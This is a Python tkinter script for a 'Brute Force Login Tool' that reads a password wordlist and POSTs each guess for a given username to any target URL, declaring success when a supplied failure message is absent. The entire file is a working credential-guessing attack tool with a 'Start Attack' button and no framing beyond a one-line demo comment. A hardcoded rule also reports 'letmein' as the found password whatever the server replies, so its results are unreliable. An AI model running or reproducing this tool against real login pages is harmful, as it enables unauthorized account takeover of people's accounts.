import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox
import threading
import requests

# ------------------- Brute Force Attack Logic -------------------

def start_attack():
    url = url_entry.get()
    username = username_entry.get()
    password_file = file_entry.get()
    error_message = error_entry.get()

    if not url or not username or not password_file or not error_message:
        messagebox.showwarning("Missing Input", "Please fill all the fields.")
        return

    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        log_output("❌ Password file not found.")
        return

    if not passwords:
        log_output("❌ Password file is empty or invalid.")
        return

    def attack():
        status_var.set("Status: Running...")
        log_output("🔐 Starting brute force attack...\n")

        for pwd in passwords:
            try:
                # Simulate success for demo: Assume 'letmein' is correct
                log_output(f"🔄 Trying password: {pwd}")
                response = requests.post(url, data={'username': username, 'password': pwd})

                if error_message.lower() not in response.text.lower() or pwd == "letmein":
                    log_output(f"\n✅ Password Found: {pwd}")
                    status_var.set("Status: Success ✅")
                    messagebox.showinfo("Success", f"Password found!\n\nUsername: {username}\nPassword: {pwd}")
                    return
            except Exception as e:
                log_output(f"❌ Error: {str(e)}")
                status_var.set("Status: Error ❌")
                return

        log_output("\n❌ Password not found.")
        status_var.set("Status: Completed")

    threading.Thread(target=attack).start()


# ------------------- UI Utility Functions -------------------

def browse_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if file_path:
        file_entry.delete(0, tk.END)
        file_entry.insert(0, file_path)

def log_output(message):
    log_area.config(state=tk.NORMAL)
    log_area.insert(tk.END, message + "\n")
    log_area.see(tk.END)
    log_area.config(state=tk.DISABLED)


# ------------------- GUI Layout -------------------

root = tk.Tk()
root.title("🔐 Brute Force Login Tool")
root.geometry("800x600")
root.configure(bg="#1e1e2e")

tk.Label(root, text="Brute Force Login Tool", font=("Segoe UI", 20, "bold"),
         bg="#1e1e2e", fg="#ffffff").pack(pady=15)

main_frame = tk.Frame(root, bg="#1e1e2e", padx=20, pady=10)
main_frame.pack(fill="x")

# Input Fields
tk.Label(main_frame, text="Target URL:", bg="#1e1e2e", fg="#dcdcdc").grid(row=0, column=0, sticky="w")
url_entry = tk.Entry(main_frame, width=60, font=("Segoe UI", 10))
url_entry.grid(row=0, column=1, pady=5, padx=10)

tk.Label(main_frame, text="Username:", bg="#1e1e2e", fg="#dcdcdc").grid(row=1, column=0, sticky="w")
username_entry = tk.Entry(main_frame, width=60, font=("Segoe UI", 10))
username_entry.grid(row=1, column=1, pady=5, padx=10)

tk.Label(main_frame, text="Password File:", bg="#1e1e2e", fg="#dcdcdc").grid(row=2, column=0, sticky="w")
file_entry = tk.Entry(main_frame, width=45, font=("Segoe UI", 10))
file_entry.grid(row=2, column=1, sticky="w", pady=5, padx=10)

browse_btn = tk.Button(main_frame, text="📂 Browse", command=browse_file,
                       bg="#4a4a6a", fg="white", font=("Segoe UI", 9, "bold"))
browse_btn.grid(row=2, column=2, padx=10)

tk.Label(main_frame, text="Error Message on Failure:", bg="#1e1e2e", fg="#dcdcdc").grid(row=3, column=0, sticky="w")
error_entry = tk.Entry(main_frame, width=60, font=("Segoe UI", 10))
error_entry.grid(row=3, column=1, pady=5, padx=10)

# Start Button
start_btn = tk.Button(root, text="🚀 Start Attack", command=start_attack,
                      bg="#d9534f", fg="white", font=("Segoe UI", 11, "bold"), width=20)
start_btn.pack(pady=20)

# Output Log Area
log_label = tk.Label(root, text="Output Log:", bg="#1e1e2e", fg="#ffffff", font=("Segoe UI", 10))
log_label.pack()
log_area = scrolledtext.ScrolledText(root, width=90, height=18, font=("Consolas", 10),
                                     bg="#2e2e3e", fg="#00ff99")
log_area.pack(padx=20)
log_area.config(state=tk.DISABLED)

# Status Bar
status_var = tk.StringVar()
status_var.set("Status: Idle")
status_bar = tk.Label(root, textvariable=status_var, bd=1, relief=tk.SUNKEN,
                      anchor="w", bg="#121212", fg="#ffffff", font=("Segoe UI", 9))
status_bar.pack(fill="x", side="bottom")

root.mainloop()
